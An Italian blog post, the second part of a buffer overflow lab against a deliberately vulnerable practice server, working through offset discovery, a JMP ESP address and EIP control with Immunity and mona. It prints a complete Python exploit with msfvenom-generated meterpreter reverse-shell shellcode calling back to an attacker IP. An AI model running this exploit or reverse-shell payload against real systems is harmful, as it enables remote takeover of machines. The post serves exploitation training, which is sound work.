---
layout:     post
title:      "Buffer Overflow lab [II parte]"
date:       2022-05-29 18:29:11 +0200
categories: [cyber-security, hacking, ita]
image:
---
Nella [prima parte](https://roccosicilia.com/2022/05/13/buffer-overflow-lab-i-parte/) ci eravamo fermati all'analisi della memoria subito dopo il crash del nostro servizio a seguito di una nostra specifica azione: abbiamo inviato un contenuto al server composto da una serie di "A" e abbiamo scoperto di poter andare a sovrascrivere il contenuto del registro EIP e anche l'area di memoria destinate alle variabili locali che fa riferimento all'ESP.

Visto che la vulnerabilità ci ha consentito di scrivere "A" ovunque possiamo calcolare la dimensione dell'area di memoria a cui abbiamo avuto accesso. Con Immunity possiamo analizzare il DUMP della memoria semplicemente facendo "tasto destro" sull'ESP e selezionando l'opzione Follow in DUMP:

<img src="{{ '/assets/images-posts/image-6.png' | relative_url }}" alt="image 6" style="float: left; width: 400px; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Nel riquadro in basso a sinistra verrà presentato lo stato della memoria e andando in cima all stack è possibile vedere l'area di memoria in cui iniziamo a scrivere (0x0097F200). In modo simile, andando sul fondo dello stack, possiamo vedere dove ci siamo fermati (0x0097FDA8). Semplicemente facendo la differenza tra questi due valori avremo la dimensione di memoria sovrascritta:

<img src="{{ '/assets/images-posts/image-7.png' | relative_url }}" alt="image 7" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Questo dato, 2984 byte, è estremamente importante per le fasi di analisi e stesura del codice del nostro exploit: ora sappiano che se inviamo questa quantità di informazioni il servizio andrà in crash e possiamo verificarlo con un piccolo script:

```
import socket

s = socket.socket()
s.connect( ("TARGET_IP", 9999) )

total_length = 2984
payload = [
	b"TRUN /.:/",
	b"A"*total_length,
]

payload = b"".join(payload)
s.send(payload)
```

Siamo quindi arrivati a governare il contenuto della memoria, EIP ed ESP compresi, tramite un nostro script. Il prossimo passo è scriverci qualcosa di sensato partendo proprio dall'instruction pointer. Dobbiamo prima di tutto capire come riempire il buffer senza mettere delle "A" anche del EIP. Una tecnico abbastanza semplice è mandare in crash il programma utilizzando caratteri che non abbiamo un pattern così da identificare successivamente cosa è stato scritto all'interno del registro ed avere così la possibilità di individuare il numero di byte necessari a riempire il buffer.

Possiamo utilizzare l'utility msf-patter_create per creare una stringa di 2984 caratteri:

```
$ msf-pattern_create -l 2984                  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5A...
```

Utilizzando la stringa all'interno del payload, al posto del carattere "A" ovviamente, otterremo nuovamente il crash del servizio ma il contenuto del registro sarà molto diverso:

<img src="{{ '/assets/images-posts/image-8.png' | relative_url }}" alt="image 8" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

L'EIP è stato infatti sovrascritto dai caratteri del pattern che qui vediamo ovviamente visualizzati con il corrispettivo byte esadecimale visto che all'interno del registro non è possibile inserire delle "stringhe" nel loro formato. Non resta che scoprire quanti caratteri - e quindi byte - sono stati scritti nel buffer prima di arrivare a sovrascrivere l'EIP. Utilizziamo questa volta l'utility msf-patter_offset a cui chiederemo il numero di byte di offset in relazione alla stringa, opportunamente convertita, corrispondente all'esadecimale che vediamo dell'EIP:

```
$ msf-pattern_offset -l 2984 -q 386F4337        
[*] Exact match at offset 2003
```

Abbiamo trovato la dimensione del buffer: 2003 byte. Per verificare il nostro calcolo possiamo quindi modificare il nostro prototipo di exploit al fine di riempire il buffer per tutti i suoi 2003 byte e poi utilizzare un altro carattere per sovrascrivere ciò che viene subito dopo, ovvero il registro EIP.

```
import socket

s = socket.socket()
s.connect( ("TARGET_IP", 9999) )

total_length = 2984
offset = 2003
new_eip = b"BBBB"

payload = [
	b"TRUN /.:/",
	b"A"*offset,
	new_eip,
]

payload = b"".join(payload)
s.send(payload)
```

Riavviando il server tramite Immunity dovremmo ottenere il seguente comportamento:

<img src="{{ '/assets/images-posts/image-9.png' | relative_url }}" alt="image 9" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Il contenuto del registro EIP è ora l'esadecimale "42 42 42 42" che corrisponde esattamente al carattere che abbiamo scelto per la variabile *new_eip* del nostro script. Ora **controlliamo l'instruction pointer** e si nota come l'ESP sia ora vuoto in quanto ci siamo fermati all'invio della stringa che doveva sovrascrivere l'EIP. Se nel nostro payload andiamo ad aggiungere un altro set di caratteri, ad esempio una serie di "C", fino a riempire i restanti byte a disposizione dovremmo ottenere la sovrascrittura controllata anche dell'ESP.

```
payload = [
	b"TRUN /.:/",
	b"A"*offset,
	new_eip,
        b"C"*(total_length - offset - len(new_eip)),
]
```

Si seguito lo stato dei registri con questa modifica:

<img src="{{ '/assets/images-posts/image-10.png' | relative_url }}" alt="image 10" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Siamo quindi nella condizione di poter scrivere ciò che vogliamo nelle tre aree di memoria a disposizione. Non stiamo però controllando l'esecuzione del programma che infatti va in crash. Questo perché non stiamo gestendo correttamente il contenuto del EIP (stiamo utilizzando dei semplici caratteri) ed il programma non può eseguire la sua JUMP nella corretta posizione di memoria dove si trova l'ESP.

Dobbiamo quindi capire in che area della memoria far puntare EIP per gestire correttamente la JUMP verso ESP. Immunity mette a disposizione diverse plugin tra cui una è MONA (<https://github.com/corelan/mona>). Non mi soffermo sull'utilizzo del tool e vi suggerisco il [manuale scritto dall'autore](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/); tramite il comando jmp -r ESP il tool ci mostra tutti i "pointers" di tipo "jmp esp":

<img src="{{ '/assets/images-posts/image-11.png' | relative_url }}" alt="image 11" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Ovviamente il servizio quando è in esecuzione ha diverse JUMP verso ESP in quanto ci sono più funzioni che vengono chiamate. A noi interessa individuare quella di cui stiamo abusando con il nostro exploit. Da notare che delle varie JUMP le ultime due contengono riferimenti a contenuti *ascii*... interessante visto che noi stiamo proprio inviando questo tipo di dato al programma. Potremmo quindi ipotizzare che una di queste JUMP sia quella che vogliamo controllare.

Per appurarlo dobbiamo annotarci il valore del registro (0x62501203 nel mio lab.) ed utilizzarlo come contenuto per l'EIP del nostro exploit. E' ovviamente da considerare che questo valore è la rappresentazione esadecimale dei byte che sono effettivamente presenti del registro, dobbiamo quindi a nostra volta mandare il corretto valore opportunamente convertito.

Utilizziamo la libreria *struct* di cui nella live su Twitch abbiamo parlato per un abbondante quarto d'ora e qui non ci soffermiamo. Per convertire correttamente il dato il comando, da utilizzare al posto delle "B", è il seguente:

```
new_eip = struct.pack('<I', 0x62501203)
```

Lo script ora sarà in grado di eseguire la JUMP in una posizione legittima dell'ESP dove, nell'ultima esecuzione, abbiamo posizionato una serie di "C". Per verificare cosa accade a runtime possiamo impostare un breakpoint su Immunity così da fermare il programma subito prima della JUMP:

<img src="{{ '/assets/images-posts/image-12.png' | relative_url }}" alt="image 12" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Eseguendo ora l'exploit dovremmo ottenere qualcosa di simile a questo:

<img src="{{ '/assets/images-posts/image-13.png' | relative_url }}" alt="image 13" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Il valore dell'EIP è quello da noi impostato e se andiamo a verificare lo stato dello stack possiamo controllare il contenuto della memoria dove sono ben visibili i caratteri "A" che stiamo utilizzando per il buffer, il contenuto dell'EIP opportunamente convertito ed i caratteri "C".

<img src="{{ '/assets/images-posts/image-14.png' | relative_url }}" alt="image 14" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Grazie al breakpoint l'esecuzione è interrotta ma possiamo utilizzare i tasti F6 ed F7 per andare indietro ed avanti una istruzione alla volta. In questo momento siamo fermi sulla JUMP quindi andando avanti di una istruzione la JUMP verrà eseguita verso un'area di memoria legittima, quella dell'ESP.

<img src="{{ '/assets/images-posts/image-15.png' | relative_url }}" alt="image 15" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Possiamo quindi osservare il contenuto delle prossime posizioni della memoria che corrisponde all'esadecimale 43, ovvero il carattere "C" con cui abbiamo riempito l'ESP. In pratica abbiamo raggiunto il principale obiettivo: **possiamo governare la JUMP in un'area della memoria che possiamo controllare**. Ora dobbiamo decidere cosa far eseguire e posizionare le istruzioni opportune in quest'area di memoria.

**Nota**: in questa occasione saltiamo il controllo di eventuali caratteri non ammessi, si prenda atto che non utilizzeremo istruzioni "\x00" nel nostro shellcode.

E' da considerare che questa operazione, in contesti più complessi rispetto al nostro vuln-server, presenta delle incertezze ed è quindi opportuno costruire le condizioni per favorire l'esecuzione del nostro shellcode. Tipicamente viene utilizzata una specifica istruzione: **\x90**, la famigerata **NOP**. Di base diremo al processore di non fare nulla per qualche iterazione prima di incontrare il nostro shellcode.

Come shellcode useremo un altro famigerato strumento: meterpreter. Per utilizzare questa reverse shell nel nostro exploit dobbiamo inserire le istruzioni necessarie all'interno del payload. Con msfvenom possiamo fare esattamente questo:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b “\x00” -f python
```

Vediamo uno ad uno parametri:

- *-p windows/meterpreter/reverse_tcp* ci serve ovviamente a definire la reverse shell che vogliamo utilizzare
- *LHOST=10.0.2.4* definisce l'IP della macchina dell'attacker a cui la shell dovrà collegarsi
- *LPORT=4444* definisce la porta della macchina dell'attacker dove il servizio sarà in ascolto
- *-b "\x00"* esclude il carattere in questione per evitare interruzioni indesiderate dello shellcode
- *-f python* aiuta i pigri e formatta l'output pronto per essere inserito in uno script python

<img src="{{ '/assets/images-posts/image-16.png' | relative_url }}" alt="image 16" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Il risultato finale è qualcosa del genere:

```
import socket
import struct

s = socket.socket()
s.connect( ("192.168.1.7", 9999) )

total_length = 2983
offset = 2003
new_eip = struct.pack('<I', 0x62501203)
nop = b"\x90"*8

buf =  b""
buf += b"\xd9\xf6\xbb\x8f\xe3\x45\x67\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x59\x31\x5a\x19\x03\x5a\x19\x83\xea\xfc\x6d"
buf += b"\x16\xb9\x8f\xfe\xd9\x42\x50\x60\xeb\x90\xd9\x85\x6f"
buf += b"\x9e\x88\x75\xfb\xf2\x20\xfe\xa9\xe6\x37\xb7\x04\x21"
buf += b"\x79\x48\x13\x5f\x51\x87\xe4\x0c\x9d\x86\x98\x4e\xf2"
buf += b"\x68\xa0\x80\x07\x69\xe5\x56\x6d\x86\xbb\x3f\x06\x0a"
buf += b"\x2c\x4b\x5a\x96\x4d\x9b\xd0\xa6\x35\x9e\x27\x52\x8a"
buf += b"\xa1\x77\x11\x5a\xba\xfc\x7d\x7b\xbb\xd1\x2d\xfe\x72"
buf += b"\xa1\xf1\x31\x7a\x03\x82\x06\x0f\x95\x42\x57\xcf\x57"
buf += b"\xa5\x95\x63\x56\xfe\x9e\x9b\x2c\xf4\xdc\x26\x37\xcf"
buf += b"\x9f\xfc\xb2\xcf\x38\x76\x64\x2b\xb8\x5b\xf3\xb8\xb6"
buf += b"\x10\x77\xe6\xda\xa7\x54\x9d\xe7\x2c\x5b\x71\x6e\x76"
buf += b"\x78\x55\x2a\x2c\xe1\xcc\x96\x83\x1e\x0e\x7e\x7b\xbb"
buf += b"\x45\x6d\x6a\xbb\xa6\x6d\x93\xe1\x30\xa1\x5e\x1a\xc0"
buf += b"\xad\xe9\x69\xf2\x72\x42\xe6\xbe\xfb\x4c\xf1\xb7\xec"
buf += b"\x6e\x2d\x7f\x7c\x91\xce\x7f\x54\x56\x9a\x2f\xce\x7f"
buf += b"\xa3\xa4\x0e\x7f\x76\x50\x05\x17\xb9\x0c\x18\xe2\x51"
buf += b"\x4e\x1b\xf9\x12\xc7\xfd\x51\x05\x87\x51\x12\xf5\x67"
buf += b"\x02\xfa\x1f\x68\x7d\x1a\x20\xa3\x16\xb1\xcf\x1d\x4e"
buf += b"\x2e\x69\x04\x04\xcf\x76\x93\x60\xcf\xfd\x11\x94\x9e"
buf += b"\xf5\x50\x86\xf7\x61\x9a\x56\x08\x04\x9a\x3c\x0c\x8e"
buf += b"\xcd\xa8\x0e\xf7\x39\x77\xf0\xd2\x3a\x70\x0e\xa3\x0a"
buf += b"\x0a\x39\x31\x32\x64\x46\xd5\xb2\x74\x10\xbf\xb2\x1c"
buf += b"\xc4\x9b\xe1\x39\x0b\x36\x96\x91\x9e\xb9\xce\x46\x08"
buf += b"\xd2\xec\xb1\x7e\x7d\x0f\x94\xfc\x7a\xef\x6a\x2b\x23"
buf += b"\x87\x94\x6b\xd3\x57\xff\x6b\x83\x3f\xf4\x44\x2c\x8f"
buf += b"\xf5\x4e\x65\x87\x7c\x1f\xc7\x36\x80\x0a\x89\xe6\x81"
buf += b"\xb9\x12\x19\xfb\xb2\xa5\xda\xfc\xda\xc1\xdb\xfc\xe2"
buf += b"\xf7\xe0\x2a\xdb\x8d\x27\xef\x58\x9d\x12\x52\xc8\x34"
buf += b"\x5c\xc0\x0a\x1d"

payload = [
	b"TRUN /.:/",
	b"A"*2003,
	new_eip,
	nop,
	buf,
	b"D"*(total_length - offset - len(new_eip) - len(nop) - len(buf)),
]

payload = b"".join(payload)
s.send(payload)
```

L'exploit è pronto e il payload è stato opportunamente modificato per aprire una shell verso la macchina attaccante. Ovviamente dobbiamo predisporre la macchina da cui eseguiremo l'exploit affinché sia in grado di accettare la connessione remota. Per comodità di laboratorio possiamo usare metasploit e configurare l'handler per meterpreter:

<img src="{{ '/assets/images-posts/image-17.png' | relative_url }}" alt="image 17" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Una volta avviato il servizio sul sistema target potremo lanciare l'exploit. Se tutto funziona correttamente il server questa volta non andrà in crash ma resterà in esecuzione senza dare messaggi specifici. Accedendo alla console di metasploit dovremmo invece vedere la sessione della shell attiva:

<img src="{{ '/assets/images-posts/image-18.png' | relative_url }}" alt="image 18" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

---

L'argomento exploiting è per me molto affascinante e lo ritengo molto utile per comprendere diversi aspetti del funzionamento dei sistemi e delle applicazioni. Quando ho annunciato la mia volontà di dedicare uno spazio in quelle che poi sono state due live per un totale di 5 ore di video e due articoli qualcuno ha etichettato l'argomento come anacronistico probabilmente non riuscendo a vedere il lato formativo del tema.

Incontro molte persone che sulla carta sono "esperti" in cyber security e che non hanno mai neanche provato ad analizzare una vulnerabilità. Ritengo che questo trend sia pericoloso, si tende a dare per scontata la conoscenza intima dei sistemi ma è evidente che c'è qualcosa che non sta funzionando nella formazione delle nuove figure professionali. Ci sono delle lacune a livello di nozioni base e questo fatto è un evidente limite che gli attacker non è detto che abbiano.
